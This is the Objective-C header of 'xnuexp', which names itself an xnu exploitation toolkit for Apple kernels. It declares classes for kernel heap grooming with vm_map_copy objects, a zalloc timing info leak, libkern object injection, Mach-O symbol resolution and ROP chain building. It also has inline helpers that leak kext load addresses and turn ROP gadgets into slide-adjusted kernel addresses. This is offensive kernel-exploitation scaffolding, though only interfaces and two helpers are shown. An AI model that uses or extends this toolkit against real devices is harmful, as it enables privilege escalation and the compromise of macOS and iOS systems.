/*
 
 xnuexp
 
 xnu exploitation toolkit
 
 contains k
 
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>

#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <dlfcn.h>
#include  <string.h>
#include <mach/mach_types.h>
#include <mach-o/loader.h>
#include <mach-o/fat.h>
#include <sys/types.h>
#include <mach-o/nlist.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/sysctl.h>

#import <Foundation/Foundation.h>


struct xnuexp_gadget
{
    char* data;
    size_t sz;
};

@interface xnuexp_vm_map_copy : NSObject
{
    mach_port_t ref;
    uint64_t tmr;
    char copied;
}
+(size_t) vm_copy_header_size;
+(xnuexp_vm_map_copy**) adjacentAllocsInKalloc:(uint16_t)size inPages:(uint16_t)pages; // zalloc timing info leak
+(xnuexp_vm_map_copy*) copyinWithPaddingSize :(size_t) zone_size;
+(xnuexp_vm_map_copy*) copyWithBytes:(void*)bytes data_size:(size_t) size;
-(xnuexp_vm_map_copy*) initCopyWithBytes:(void*)bytes data_size:(size_t) size;
-(uint64_t) copyinTime;
-(char*) copyout;
@end

@interface xnuexp_libkern_obj : NSObject
{
    mach_port_t ref;
    uint64_t tmr;
}
+(xnuexp_libkern_obj*) libkernObjectWithUserlandObject: (id) object;
-(id) copyIntoUserland;
@end

@interface xnuexp_mach_o : NSObject
{
    NSMutableDictionary* symbolCache;
    struct mach_header* hdr;
    uint32_t free_size;
    uint64_t slide;
    uint64_t base;
}
@property(assign) uint64_t slide;
@property(readonly) struct mach_header* hdr;
@property(readonly) uint32_t free_size;
@property(readonly) uint64_t base;
- (xnuexp_mach_o*) initWithContentsOfFile:(NSString*) path;
- (xnuexp_mach_o*) initWithBytes:(struct mach_header*) header;
+ (xnuexp_mach_o*) withContentsOfFile:(NSString*) path;
+ (xnuexp_mach_o*) withBytes:(struct mach_header*) header;
- (uint64_t) solveSymbol:(NSString*) string;
@end

@interface xnuexp_fat_mach_o : NSObject // XXX
{
    struct fat_header* hdr;
    uint32_t free_size;
}
- (xnuexp_fat_mach_o*) initWithContentsOfFile:(NSString*) path;
- (xnuexp_fat_mach_o*) initWithBytes:(struct fat_header*) header;
+ (xnuexp_fat_mach_o*) withContentsOfFile:(NSString*) path;
+ (xnuexp_fat_mach_o*) withBytes:(struct fat_header*) header;
- (xnuexp_mach_o*) getArchitectureByNumber:(uint32_t) archNum;
- (xnuexp_mach_o*) getArchitectureByFirstMagicMatch:(uint32_t) magic;
- (xnuexp_mach_o*) getArchitectureByCPUType:(uint32_t) cpuType subType:(uint32_t) cpuSubtype;
@end

@interface xnuexp_stack : NSObject
{
    NSMutableData* data;
    xnuexp_mach_o* binlay;
}
@property(readonly) NSMutableData* data;
+(xnuexp_stack*)stackWithBinaryLayout:(xnuexp_mach_o*) binlay_;
-(xnuexp_stack*)initWithBinaryLayout:(xnuexp_mach_o*) binlay_;
-(void) pad: (uint64_t)count /* pushes ROP_NOP count times */;
-(void) push: (uint64_t)imm;
-(uint64_t) pop;
-(void) callFunctionPointer: (uint64_t)pointer withArguments:(uint64_t /* 4 args maximum */)count, ...;
-(void) callFunctionWithName:(NSString*) name withArguments:(uint64_t /* 4 args maximum */)count, ...;
-(void) pushGadget:(struct xnuexp_gadget) gadget;
-(void) callFunctionPointer: (uint64_t)pointer count:(char)count varargs:(va_list)list;
-(void) readPointer64: (uint64_t)pointer;
@end
extern CFDictionaryRef OSKextCopyLoadedKextInfo(CFArrayRef, CFArrayRef);

__attribute__((always_inline)) static inline uint64_t KEXT_BASEADDR(const char* identifier){
    return (uint64_t)[((NSNumber*)(((__bridge NSDictionary*)OSKextCopyLoadedKextInfo(NULL, NULL))[[NSString stringWithUTF8String:identifier]][@"OSBundleLoadAddress"])) unsignedLongLongValue];
}

__attribute__((always_inline)) static inline uint64_t ROP_POINTER(xnuexp_mach_o* binlay, struct xnuexp_gadget gadget) {
    uint64_t gadget_ptr = (uint64_t) memmem([binlay hdr], [binlay free_size], gadget.data, gadget.sz);
    assert(gadget_ptr);
    return gadget_ptr + binlay.slide - (uint64_t)[binlay hdr] + [binlay base];
}
